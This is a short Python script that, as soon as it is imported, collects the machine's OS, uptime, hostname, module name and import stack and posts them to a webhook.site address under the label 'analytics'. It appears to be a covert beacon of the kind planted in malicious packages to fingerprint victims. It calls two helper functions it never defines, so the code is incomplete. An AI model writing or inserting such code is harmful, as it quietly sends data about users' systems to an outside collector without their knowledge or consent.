import os
import platform
import socket
import time
import psutil
import requests
import importlib.metadata
import traceback
import inspect

# Collect system information
os_info = platform.system()
uptime = time.time() - psutil.boot_time()

# Attempt to find and print the import stack
stack_info = find_import_stack()
context = find_import_context()
print(f"Import context: {context}")

# Prepare data to send
data = {
    'os': os_info,
    'uptime': uptime,
    'hostname': socket.gethostname(),
    'package_info': __name__,
    'context': context,
    'import_stack': stack_info,
}

# Send the data to a specific URL
response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)
if response.status_code == 200:
    print("Analytics sent successfully.")

else:
    print(f"Failed to send analytics. Status code: {response.status_code}")